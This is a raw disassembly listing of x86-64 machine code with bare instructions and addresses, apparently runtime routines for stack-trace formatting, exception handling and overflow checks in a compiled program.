    6d8c41e8:	41 55                	push   %r13
    6d8c41ea:	41 54                	push   %r12
    6d8c41ec:	55                   	push   %rbp
    6d8c41ed:	57                   	push   %rdi
    6d8c41ee:	56                   	push   %rsi
    6d8c41ef:	53                   	push   %rbx
    6d8c41f0:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c41f4:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    6d8c41fb:	00 00 
    6d8c41fd:	48 89 cb             	mov    %rcx,%rbx
    6d8c4200:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
    6d8c4205:	e8 4a fd ff ff       	call   0x6d8c3f54
    6d8c420a:	48 85 db             	test   %rbx,%rbx
    6d8c420d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c4212:	0f 84 5c 01 00 00    	je     0x6d8c4374
    6d8c4218:	4c 8b 23             	mov    (%rbx),%r12
    6d8c421b:	31 ff                	xor    %edi,%edi
    6d8c421d:	48 83 c3 10          	add    $0x10,%rbx
    6d8c4221:	41 bd 19 00 00 00    	mov    $0x19,%r13d
    6d8c4227:	48 8d 6c 24 28       	lea    0x28(%rsp),%rbp
    6d8c422c:	41 be 01 00 00 00    	mov    $0x1,%r14d
    6d8c4232:	4c 39 e7             	cmp    %r12,%rdi
    6d8c4235:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c423a:	0f 8d 34 01 00 00    	jge    0x6d8c4374
    6d8c4240:	48 8b 43 08          	mov    0x8(%rbx),%rax
    6d8c4244:	48 83 f8 f6          	cmp    $0xfffffffffffffff6,%rax
    6d8c4248:	74 08                	je     0x6d8c4252
    6d8c424a:	48 83 f8 9c          	cmp    $0xffffffffffffff9c,%rax
    6d8c424e:	75 1d                	jne    0x6d8c426d
    6d8c4250:	eb 27                	jmp    0x6d8c4279
    6d8c4252:	ba 11 00 00 00       	mov    $0x11,%edx
    6d8c4257:	e8 2b fd ff ff       	call   0x6d8c3f87
    6d8c425c:	48 8d 15 1d e2 00 00 	lea    0xe21d(%rip),%rdx        # 0x6d8d2480
    6d8c4263:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c4268:	e9 f3 00 00 00       	jmp    0x6d8c4360
    6d8c426d:	31 f6                	xor    %esi,%esi
    6d8c426f:	48 85 c9             	test   %rcx,%rcx
    6d8c4272:	74 20                	je     0x6d8c4294
    6d8c4274:	48 8b 31             	mov    (%rcx),%rsi
    6d8c4277:	eb 1b                	jmp    0x6d8c4294
    6d8c4279:	ba 03 00 00 00       	mov    $0x3,%edx
    6d8c427e:	e8 04 fd ff ff       	call   0x6d8c3f87
    6d8c4283:	48 8d 15 c6 e1 00 00 	lea    0xe1c6(%rip),%rdx        # 0x6d8d2450
    6d8c428a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c428f:	e9 cc 00 00 00       	jmp    0x6d8c4360
    6d8c4294:	48 8b 53 10          	mov    0x10(%rbx),%rdx
    6d8c4298:	48 89 e9             	mov    %rbp,%rcx
    6d8c429b:	e8 4e fe ff ff       	call   0x6d8c40ee
    6d8c42a0:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
    6d8c42a5:	7e 52                	jle    0x6d8c42f9
    6d8c42a7:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c42ac:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c42b1:	e8 d1 fc ff ff       	call   0x6d8c3f87
    6d8c42b6:	48 8d 15 73 e1 00 00 	lea    0xe173(%rip),%rdx        # 0x6d8d2430
    6d8c42bd:	48 89 c1             	mov    %rax,%rcx
    6d8c42c0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c42c5:	e8 de d9 ff ff       	call   0x6d8c1ca8
    6d8c42ca:	48 8b 53 08          	mov    0x8(%rbx),%rdx
    6d8c42ce:	48 89 e9             	mov    %rbp,%rcx
    6d8c42d1:	e8 99 d1 ff ff       	call   0x6d8c146f
    6d8c42d6:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c42db:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c42e0:	e8 a2 fc ff ff       	call   0x6d8c3f87
    6d8c42e5:	48 8d 15 24 e1 00 00 	lea    0xe124(%rip),%rdx        # 0x6d8d2410
    6d8c42ec:	48 89 c1             	mov    %rax,%rcx
    6d8c42ef:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c42f4:	e8 af d9 ff ff       	call   0x6d8c1ca8
    6d8c42f9:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
    6d8c42fe:	31 c0                	xor    %eax,%eax
    6d8c4300:	48 85 d2             	test   %rdx,%rdx
    6d8c4303:	74 03                	je     0x6d8c4308
    6d8c4305:	48 8b 02             	mov    (%rdx),%rax
    6d8c4308:	48 29 f0             	sub    %rsi,%rax
    6d8c430b:	4c 89 ee             	mov    %r13,%rsi
    6d8c430e:	41 bf 01 00 00 00    	mov    $0x1,%r15d
    6d8c4314:	48 29 c6             	sub    %rax,%rsi
    6d8c4317:	48 85 f6             	test   %rsi,%rsi
    6d8c431a:	49 0f 4e f6          	cmovle %r14,%rsi
    6d8c431e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c4323:	ba 20 00 00 00       	mov    $0x20,%edx
    6d8c4328:	49 ff c7             	inc    %r15
    6d8c432b:	e8 cd fc ff ff       	call   0x6d8c3ffd
    6d8c4330:	4c 39 fe             	cmp    %r15,%rsi
    6d8c4333:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c4338:	7d e4                	jge    0x6d8c431e
    6d8c433a:	48 8b 13             	mov    (%rbx),%rdx
    6d8c433d:	48 89 e9             	mov    %rbp,%rcx
    6d8c4340:	e8 a9 fd ff ff       	call   0x6d8c40ee
    6d8c4345:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c434a:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c434f:	e8 33 fc ff ff       	call   0x6d8c3f87
    6d8c4354:	48 8d 15 95 e0 00 00 	lea    0xe095(%rip),%rdx        # 0x6d8d23f0
    6d8c435b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c4360:	48 89 c1             	mov    %rax,%rcx
    6d8c4363:	48 ff c7             	inc    %rdi
    6d8c4366:	48 83 c3 18          	add    $0x18,%rbx
    6d8c436a:	e8 39 d9 ff ff       	call   0x6d8c1ca8
    6d8c436f:	e9 be fe ff ff       	jmp    0x6d8c4232
    6d8c4374:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8c4379:	48 83 c4 38          	add    $0x38,%rsp
    6d8c437d:	5b                   	pop    %rbx
    6d8c437e:	5e                   	pop    %rsi
    6d8c437f:	5f                   	pop    %rdi
    6d8c4380:	5d                   	pop    %rbp
    6d8c4381:	41 5c                	pop    %r12
    6d8c4383:	41 5d                	pop    %r13
    6d8c4385:	41 5e                	pop    %r14
    6d8c4387:	41 5f                	pop    %r15
    6d8c4389:	c3                   	ret
    6d8c438a:	56                   	push   %rsi
    6d8c438b:	53                   	push   %rbx
    6d8c438c:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c4390:	48 89 ce             	mov    %rcx,%rsi
    6d8c4393:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    6d8c4398:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c439d:	ff 15 8d cc 00 00    	call   *0xcc8d(%rip)        # 0x6d8d1030
    6d8c43a3:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
    6d8c43a8:	48 89 f1             	mov    %rsi,%rcx
    6d8c43ab:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c43b0:	48 89 c3             	mov    %rax,%rbx
    6d8c43b3:	49 89 c1             	mov    %rax,%r9
    6d8c43b6:	e8 a5 a1 00 00       	call   0x6d8ce560
    6d8c43bb:	48 89 d9             	mov    %rbx,%rcx
    6d8c43be:	48 83 c4 38          	add    $0x38,%rsp
    6d8c43c2:	5b                   	pop    %rbx
    6d8c43c3:	5e                   	pop    %rsi
    6d8c43c4:	e9 b7 a1 00 00       	jmp    0x6d8ce580
    6d8c43c9:	55                   	push   %rbp
    6d8c43ca:	48 89 e5             	mov    %rsp,%rbp
    6d8c43cd:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
    6d8c43d4:	48 83 3d 64 33 10 00 	cmpq   $0x0,0x103364(%rip)        # 0x6d9c7740
    6d8c43db:	00 
    6d8c43dc:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
    6d8c43e0:	48 89 55 18          	mov    %rdx,0x18(%rbp)
    6d8c43e4:	c6 85 ef fe ff ff 01 	movb   $0x1,-0x111(%rbp)
    6d8c43eb:	0f 84 a4 00 00 00    	je     0x6d8c4495
    6d8c43f1:	48 8b 05 48 95 0f 00 	mov    0xf9548(%rip),%rax        # 0x6d9bd940
    6d8c43f8:	48 8d 8d f0 fe ff ff 	lea    -0x110(%rbp),%rcx
    6d8c43ff:	48 89 ea             	mov    %rbp,%rdx
    6d8c4402:	48 89 0d 37 95 0f 00 	mov    %rcx,0xf9537(%rip)        # 0x6d9bd940
    6d8c4409:	48 83 c1 10          	add    $0x10,%rcx
    6d8c440d:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
    6d8c4414:	e8 8f a1 00 00       	call   0x6d8ce5a8
    6d8c4419:	48 98                	cltq
    6d8c441b:	48 85 c0             	test   %rax,%rax
    6d8c441e:	48 89 85 f8 fe ff ff 	mov    %rax,-0x108(%rbp)
    6d8c4425:	75 2c                	jne    0x6d8c4453
    6d8c4427:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
    6d8c442b:	e8 fd f9 ff ff       	call   0x6d8c3e2d
    6d8c4430:	48 89 c1             	mov    %rax,%rcx
    6d8c4433:	ff 15 07 33 10 00    	call   *0x103307(%rip)        # 0x6d9c7740
    6d8c4439:	48 8b 05 00 95 0f 00 	mov    0xf9500(%rip),%rax        # 0x6d9bd940
    6d8c4440:	c6 85 ef fe ff ff 00 	movb   $0x0,-0x111(%rbp)
    6d8c4447:	48 8b 00             	mov    (%rax),%rax
    6d8c444a:	48 89 05 ef 94 0f 00 	mov    %rax,0xf94ef(%rip)        # 0x6d9bd940
    6d8c4451:	eb 33                	jmp    0x6d8c4486
    6d8c4453:	48 8b 05 e6 94 0f 00 	mov    0xf94e6(%rip),%rax        # 0x6d9bd940
    6d8c445a:	48 8d 0d bf 31 10 00 	lea    0x1031bf(%rip),%rcx        # 0x6d9c7620
    6d8c4461:	48 8b 00             	mov    (%rax),%rax
    6d8c4464:	48 c7 85 f8 fe ff ff 	movq   $0x0,-0x108(%rbp)
    6d8c446b:	00 00 00 00 
    6d8c446f:	48 89 05 ca 94 0f 00 	mov    %rax,0xf94ca(%rip)        # 0x6d9bd940
    6d8c4476:	48 8b 05 a3 31 10 00 	mov    0x1031a3(%rip),%rax        # 0x6d9c7620
    6d8c447d:	48 8b 50 28          	mov    0x28(%rax),%rdx
    6d8c4481:	e8 16 e9 ff ff       	call   0x6d8c2d9c
    6d8c4486:	48 83 bd f8 fe ff ff 	cmpq   $0x0,-0x108(%rbp)
    6d8c448d:	00 
    6d8c448e:	74 05                	je     0x6d8c4495
    6d8c4490:	e8 5b 04 00 00       	call   0x6d8c48f0
    6d8c4495:	8a 85 ef fe ff ff    	mov    -0x111(%rbp),%al
    6d8c449b:	84 c0                	test   %al,%al
    6d8c449d:	74 0e                	je     0x6d8c44ad
    6d8c449f:	48 8b 55 18          	mov    0x18(%rbp),%rdx
    6d8c44a3:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
    6d8c44a7:	e8 de fe ff ff       	call   0x6d8c438a
    6d8c44ac:	90                   	nop
    6d8c44ad:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
    6d8c44b4:	5d                   	pop    %rbp
    6d8c44b5:	c3                   	ret
    6d8c44b6:	41 54                	push   %r12
    6d8c44b8:	55                   	push   %rbp
    6d8c44b9:	57                   	push   %rdi
    6d8c44ba:	56                   	push   %rsi
    6d8c44bb:	53                   	push   %rbx
    6d8c44bc:	48 81 ec 00 08 00 00 	sub    $0x800,%rsp
    6d8c44c3:	ba d1 07 00 00       	mov    $0x7d1,%edx
    6d8c44c8:	48 8d 6c 24 2f       	lea    0x2f(%rsp),%rbp
    6d8c44cd:	49 89 cc             	mov    %rcx,%r12
    6d8c44d0:	48 89 e9             	mov    %rbp,%rcx
    6d8c44d3:	e8 76 d7 ff ff       	call   0x6d8c1c4e
    6d8c44d8:	49 8b 4c 24 20       	mov    0x20(%r12),%rcx
    6d8c44dd:	48 85 c9             	test   %rcx,%rcx
    6d8c44e0:	74 06                	je     0x6d8c44e8
    6d8c44e2:	48 83 39 00          	cmpq   $0x0,(%rcx)
    6d8c44e6:	75 04                	jne    0x6d8c44ec
    6d8c44e8:	31 db                	xor    %ebx,%ebx
    6d8c44ea:	eb 53                	jmp    0x6d8c453f
    6d8c44ec:	e8 f3 fc ff ff       	call   0x6d8c41e4
    6d8c44f1:	48 85 c0             	test   %rax,%rax
    6d8c44f4:	48 89 c2             	mov    %rax,%rdx
    6d8c44f7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    6d8c44fc:	74 10                	je     0x6d8c450e
    6d8c44fe:	4c 8b 00             	mov    (%rax),%r8
    6d8c4501:	49 81 f8 cf 07 00 00 	cmp    $0x7cf,%r8
    6d8c4508:	7e 07                	jle    0x6d8c4511
    6d8c450a:	31 db                	xor    %ebx,%ebx
    6d8c450c:	eb 1e                	jmp    0x6d8c452c
    6d8c450e:	45 31 c0             	xor    %r8d,%r8d
    6d8c4511:	48 89 d1             	mov    %rdx,%rcx
    6d8c4514:	48 89 ef             	mov    %rbp,%rdi
    6d8c4517:	e8 d4 d6 ff ff       	call   0x6d8c1bf0
    6d8c451c:	48 85 d2             	test   %rdx,%rdx
    6d8c451f:	48 89 c6             	mov    %rax,%rsi
    6d8c4522:	4c 89 c1             	mov    %r8,%rcx
    6d8c4525:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c4527:	74 e1                	je     0x6d8c450a
    6d8c4529:	48 8b 1a             	mov    (%rdx),%rbx
    6d8c452c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    6d8c4531:	e8 9a cf ff ff       	call   0x6d8c14d0
    6d8c4536:	48 81 fb b3 07 00 00 	cmp    $0x7b3,%rbx
    6d8c453d:	7f 1a                	jg     0x6d8c4559
    6d8c453f:	48 8d 44 1d 00       	lea    0x0(%rbp,%rbx,1),%rax
    6d8c4544:	b9 07 00 00 00       	mov    $0x7,%ecx
    6d8c4549:	48 83 c3 1c          	add    $0x1c,%rbx
    6d8c454d:	48 8d 35 7d dc 00 00 	lea    0xdc7d(%rip),%rsi        # 0x6d8d21d1
    6d8c4554:	48 89 c7             	mov    %rax,%rdi
    6d8c4557:	f3 a5                	rep movsl (%rsi),(%rdi)
    6d8c4559:	4d 8b 44 24 18       	mov    0x18(%r12),%r8
    6d8c455e:	31 d2                	xor    %edx,%edx
    6d8c4560:	4d 85 c0             	test   %r8,%r8
    6d8c4563:	74 03                	je     0x6d8c4568
    6d8c4565:	49 8b 10             	mov    (%r8),%rdx
    6d8c4568:	48 8d 04 13          	lea    (%rbx,%rdx,1),%rax
    6d8c456c:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
    6d8c4572:	7f 25                	jg     0x6d8c4599
    6d8c4574:	4c 89 c1             	mov    %r8,%rcx
    6d8c4577:	e8 74 d6 ff ff       	call   0x6d8c1bf0
    6d8c457c:	48 89 c6             	mov    %rax,%rsi
    6d8c457f:	48 89 d1             	mov    %rdx,%rcx
    6d8c4582:	48 8d 44 1d 00       	lea    0x0(%rbp,%rbx,1),%rax
    6d8c4587:	48 89 c7             	mov    %rax,%rdi
    6d8c458a:	31 c0                	xor    %eax,%eax
    6d8c458c:	4d 85 c0             	test   %r8,%r8
    6d8c458f:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c4591:	74 03                	je     0x6d8c4596
    6d8c4593:	49 8b 00             	mov    (%r8),%rax
    6d8c4596:	48 01 c3             	add    %rax,%rbx
    6d8c4599:	48 81 fb cd 07 00 00 	cmp    $0x7cd,%rbx
    6d8c45a0:	7f 0b                	jg     0x6d8c45ad
    6d8c45a2:	66 c7 44 1d 00 20 5b 	movw   $0x5b20,0x0(%rbp,%rbx,1)
    6d8c45a9:	48 83 c3 02          	add    $0x2,%rbx
    6d8c45ad:	49 8b 54 24 10       	mov    0x10(%r12),%rdx
    6d8c45b2:	31 c9                	xor    %ecx,%ecx
    6d8c45b4:	48 85 d2             	test   %rdx,%rdx
    6d8c45b7:	74 17                	je     0x6d8c45d0
    6d8c45b9:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6d8c45bd:	31 c0                	xor    %eax,%eax
    6d8c45bf:	48 89 d7             	mov    %rdx,%rdi
    6d8c45c2:	f2 ae                	repnz scas (%rdi),%al
    6d8c45c4:	48 89 ce             	mov    %rcx,%rsi
    6d8c45c7:	48 f7 d6             	not    %rsi
    6d8c45ca:	48 89 f1             	mov    %rsi,%rcx
    6d8c45cd:	48 ff c9             	dec    %rcx
    6d8c45d0:	48 8d 04 0b          	lea    (%rbx,%rcx,1),%rax
    6d8c45d4:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
    6d8c45da:	7f 23                	jg     0x6d8c45ff
    6d8c45dc:	48 8d 44 1d 00       	lea    0x0(%rbp,%rbx,1),%rax
    6d8c45e1:	48 89 d6             	mov    %rdx,%rsi
    6d8c45e4:	48 89 c7             	mov    %rax,%rdi
    6d8c45e7:	31 c0                	xor    %eax,%eax
    6d8c45e9:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c45eb:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6d8c45ef:	48 89 d7             	mov    %rdx,%rdi
    6d8c45f2:	f2 ae                	repnz scas (%rdi),%al
    6d8c45f4:	48 89 c8             	mov    %rcx,%rax
    6d8c45f7:	48 f7 d0             	not    %rax
    6d8c45fa:	48 8d 5c 03 ff       	lea    -0x1(%rbx,%rax,1),%rbx
    6d8c45ff:	48 81 fb cd 07 00 00 	cmp    $0x7cd,%rbx
    6d8c4606:	7f 0b                	jg     0x6d8c4613
    6d8c4608:	66 c7 44 1d 00 5d 0a 	movw   $0xa5d,0x0(%rbp,%rbx,1)
    6d8c460f:	48 83 c3 02          	add    $0x2,%rbx
    6d8c4613:	48 83 3d 65 2e 10 00 	cmpq   $0x0,0x102e65(%rip)        # 0x6d9c7480
    6d8c461a:	00 
    6d8c461b:	75 0d                	jne    0x6d8c462a
    6d8c461d:	48 89 da             	mov    %rbx,%rdx
    6d8c4620:	48 89 e9             	mov    %rbp,%rcx
    6d8c4623:	e8 a1 fd ff ff       	call   0x6d8c43c9
    6d8c4628:	eb 12                	jmp    0x6d8c463c
    6d8c462a:	48 89 e9             	mov    %rbp,%rcx
    6d8c462d:	e8 fb f7 ff ff       	call   0x6d8c3e2d
    6d8c4632:	48 89 c1             	mov    %rax,%rcx
    6d8c4635:	ff 15 45 2e 10 00    	call   *0x102e45(%rip)        # 0x6d9c7480
    6d8c463b:	90                   	nop
    6d8c463c:	48 81 c4 00 08 00 00 	add    $0x800,%rsp
    6d8c4643:	5b                   	pop    %rbx
    6d8c4644:	5e                   	pop    %rsi
    6d8c4645:	5f                   	pop    %rdi
    6d8c4646:	5d                   	pop    %rbp
    6d8c4647:	41 5c                	pop    %r12
    6d8c4649:	c3                   	ret
    6d8c464a:	53                   	push   %rbx
    6d8c464b:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c464f:	48 8b 05 12 2f 10 00 	mov    0x102f12(%rip),%rax        # 0x6d9c7568
    6d8c4656:	48 85 c0             	test   %rax,%rax
    6d8c4659:	48 89 cb             	mov    %rcx,%rbx
    6d8c465c:	74 02                	je     0x6d8c4660
    6d8c465e:	ff d0                	call   *%rax
    6d8c4660:	48 89 d9             	mov    %rbx,%rcx
    6d8c4663:	48 83 c4 20          	add    $0x20,%rsp
    6d8c4667:	5b                   	pop    %rbx
    6d8c4668:	e9 49 fe ff ff       	jmp    0x6d8c44b6
    6d8c466d:	53                   	push   %rbx
    6d8c466e:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c4672:	48 8b 05 a7 2d 10 00 	mov    0x102da7(%rip),%rax        # 0x6d9c7420
    6d8c4679:	48 85 c0             	test   %rax,%rax
    6d8c467c:	48 89 cb             	mov    %rcx,%rbx
    6d8c467f:	75 0e                	jne    0x6d8c468f
    6d8c4681:	48 8b 05 d8 2e 10 00 	mov    0x102ed8(%rip),%rax        # 0x6d9c7560
    6d8c4688:	48 85 c0             	test   %rax,%rax
    6d8c468b:	75 0a                	jne    0x6d8c4697
    6d8c468d:	eb 11                	jmp    0x6d8c46a0
    6d8c468f:	ff d0                	call   *%rax
    6d8c4691:	84 c0                	test   %al,%al
    6d8c4693:	75 ec                	jne    0x6d8c4681
    6d8c4695:	eb 5a                	jmp    0x6d8c46f1
    6d8c4697:	48 89 d9             	mov    %rbx,%rcx
    6d8c469a:	ff d0                	call   *%rax
    6d8c469c:	84 c0                	test   %al,%al
    6d8c469e:	74 51                	je     0x6d8c46f1
    6d8c46a0:	48 83 3d 98 92 0f 00 	cmpq   $0x0,0xf9298(%rip)        # 0x6d9bd940
    6d8c46a7:	00 
    6d8c46a8:	75 12                	jne    0x6d8c46bc
    6d8c46aa:	48 89 d9             	mov    %rbx,%rcx
    6d8c46ad:	e8 98 ff ff ff       	call   0x6d8c464a
    6d8c46b2:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c46b7:	e8 cc 9e 00 00       	call   0x6d8ce588
    6d8c46bc:	48 8b 15 5d 2f 10 00 	mov    0x102f5d(%rip),%rdx        # 0x6d9c7620
    6d8c46c3:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
    6d8c46c7:	e8 d0 e6 ff ff       	call   0x6d8c2d9c
    6d8c46cc:	48 8d 0d 4d 2f 10 00 	lea    0x102f4d(%rip),%rcx        # 0x6d9c7620
    6d8c46d3:	48 89 da             	mov    %rbx,%rdx
    6d8c46d6:	e8 c1 e6 ff ff       	call   0x6d8c2d9c
    6d8c46db:	48 8b 05 5e 92 0f 00 	mov    0xf925e(%rip),%rax        # 0x6d9bd940
    6d8c46e2:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c46e7:	48 8d 48 10          	lea    0x10(%rax),%rcx
    6d8c46eb:	e8 26 9e 00 00       	call   0x6d8ce516
    6d8c46f0:	90                   	nop
    6d8c46f1:	48 83 c4 20          	add    $0x20,%rsp
    6d8c46f5:	5b                   	pop    %rbx
    6d8c46f6:	c3                   	ret
    6d8c46f7:	57                   	push   %rdi
    6d8c46f8:	56                   	push   %rsi
    6d8c46f9:	53                   	push   %rbx
    6d8c46fa:	48 83 ec 40          	sub    $0x40,%rsp
    6d8c46fe:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
    6d8c4703:	48 89 cb             	mov    %rcx,%rbx
    6d8c4706:	75 04                	jne    0x6d8c470c
    6d8c4708:	48 89 51 10          	mov    %rdx,0x10(%rcx)
    6d8c470c:	4d 85 c0             	test   %r8,%r8
    6d8c470f:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
    6d8c4714:	74 70                	je     0x6d8c4786
    6d8c4716:	4d 85 c9             	test   %r9,%r9
    6d8c4719:	74 6b                	je     0x6d8c4786
    6d8c471b:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
    6d8c4720:	ba 18 00 00 00       	mov    $0x18,%edx
    6d8c4725:	48 89 f1             	mov    %rsi,%rcx
    6d8c4728:	e8 21 d5 ff ff       	call   0x6d8c1c4e
    6d8c472d:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
    6d8c4731:	48 8d 15 a8 2d 10 00 	lea    0x102da8(%rip),%rdx        # 0x6d9c74e0
    6d8c4738:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
    6d8c473d:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
    6d8c4742:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
    6d8c4749:	00 
    6d8c474a:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
    6d8c474f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
    6d8c4754:	e8 fb 00 00 00       	call   0x6d8c4854
    6d8c4759:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
    6d8c475d:	48 89 c2             	mov    %rax,%rdx
    6d8c4760:	e8 37 e6 ff ff       	call   0x6d8c2d9c
    6d8c4765:	48 8b 53 20          	mov    0x20(%rbx),%rdx
    6d8c4769:	48 8b 02             	mov    (%rdx),%rax
    6d8c476c:	48 8d 48 01          	lea    0x1(%rax),%rcx
    6d8c4770:	48 6b c0 18          	imul   $0x18,%rax,%rax
    6d8c4774:	48 89 0a             	mov    %rcx,(%rdx)
    6d8c4777:	b9 06 00 00 00       	mov    $0x6,%ecx
    6d8c477c:	48 8d 44 02 10       	lea    0x10(%rdx,%rax,1),%rax
    6d8c4781:	48 89 c7             	mov    %rax,%rdi
    6d8c4784:	f3 a5                	rep movsl (%rsi),(%rdi)
    6d8c4786:	48 89 d9             	mov    %rbx,%rcx
    6d8c4789:	e8 df fe ff ff       	call   0x6d8c466d
    6d8c478e:	90                   	nop
    6d8c478f:	48 83 c4 40          	add    $0x40,%rsp
    6d8c4793:	5b                   	pop    %rbx
    6d8c4794:	5e                   	pop    %rsi
    6d8c4795:	5f                   	pop    %rdi
    6d8c4796:	c3                   	ret
    6d8c4797:	56                   	push   %rsi
    6d8c4798:	53                   	push   %rbx
    6d8c4799:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c479d:	48 8d 0d 3c 2c 10 00 	lea    0x102c3c(%rip),%rcx        # 0x6d9c73e0
    6d8c47a4:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c47a9:	e8 a7 f6 ff ff       	call   0x6d8c3e55
    6d8c47ae:	48 8d 0d 0b dd 00 00 	lea    0xdd0b(%rip),%rcx        # 0x6d8d24c0
    6d8c47b5:	48 89 c3             	mov    %rax,%rbx
    6d8c47b8:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    6d8c47bc:	48 8d 05 dd 2c 10 00 	lea    0x102cdd(%rip),%rax        # 0x6d9c74a0
    6d8c47c3:	48 89 03             	mov    %rax,(%rbx)
    6d8c47c6:	48 8d 05 21 da 00 00 	lea    0xda21(%rip),%rax        # 0x6d8d21ee
    6d8c47cd:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c47d1:	e8 fa f6 ff ff       	call   0x6d8c3ed0
    6d8c47d6:	48 85 f6             	test   %rsi,%rsi
    6d8c47d9:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6d8c47dd:	74 09                	je     0x6d8c47e8
    6d8c47df:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
    6d8c47e3:	e8 97 e5 ff ff       	call   0x6d8c2d7f
    6d8c47e8:	48 c7 44 24 20 35 00 	movq   $0x35,0x20(%rsp)
    6d8c47ef:	00 00 
    6d8c47f1:	4c 8d 0d 05 da 00 00 	lea    0xda05(%rip),%r9        # 0x6d8d21fd
    6d8c47f8:	48 89 d9             	mov    %rbx,%rcx
    6d8c47fb:	4c 8d 05 05 da 00 00 	lea    0xda05(%rip),%r8        # 0x6d8d2207
    6d8c4802:	48 8d 15 e5 d9 00 00 	lea    0xd9e5(%rip),%rdx        # 0x6d8d21ee
    6d8c4809:	e8 e9 fe ff ff       	call   0x6d8c46f7
    6d8c480e:	90                   	nop
    6d8c480f:	53                   	push   %rbx
    6d8c4810:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c4814:	4c 8b 41 18          	mov    0x18(%rcx),%r8
    6d8c4818:	48 89 d3             	mov    %rdx,%rbx
    6d8c481b:	49 8b 50 08          	mov    0x8(%r8),%rdx
    6d8c481f:	49 89 c9             	mov    %rcx,%r9
    6d8c4822:	b9 10 00 00 00       	mov    $0x10,%ecx
    6d8c4827:	e8 7a e7 ff ff       	call   0x6d8c2fa6
    6d8c482c:	48 89 da             	mov    %rbx,%rdx
    6d8c482f:	49 0f af 10          	imul   (%r8),%rdx
    6d8c4833:	70 05                	jo     0x6d8c483a
    6d8c4835:	48 01 c2             	add    %rax,%rdx
    6d8c4838:	71 05                	jno    0x6d8c483f
    6d8c483a:	e8 58 ff ff ff       	call   0x6d8c4797
    6d8c483f:	4c 89 c9             	mov    %r9,%rcx
    6d8c4842:	e8 0e f6 ff ff       	call   0x6d8c3e55
    6d8c4847:	48 89 18             	mov    %rbx,(%rax)
    6d8c484a:	48 89 58 08          	mov    %rbx,0x8(%rax)
    6d8c484e:	48 83 c4 20          	add    $0x20,%rsp
    6d8c4852:	5b                   	pop    %rbx
    6d8c4853:	c3                   	ret
    6d8c4854:	57                   	push   %rdi
    6d8c4855:	56                   	push   %rsi
    6d8c4856:	53                   	push   %rbx
    6d8c4857:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c485b:	48 85 c9             	test   %rcx,%rcx
    6d8c485e:	48 89 cb             	mov    %rcx,%rbx
    6d8c4861:	48 89 d6             	mov    %rdx,%rsi
    6d8c4864:	74 68                	je     0x6d8c48ce
    6d8c4866:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
    6d8c486d:	ff ff 3f 
    6d8c4870:	48 23 4b 08          	and    0x8(%rbx),%rcx
    6d8c4874:	48 3b 0b             	cmp    (%rbx),%rcx
    6d8c4877:	7f 6c                	jg     0x6d8c48e5
    6d8c4879:	e8 51 d3 ff ff       	call   0x6d8c1bcf
    6d8c487e:	48 89 f1             	mov    %rsi,%rcx
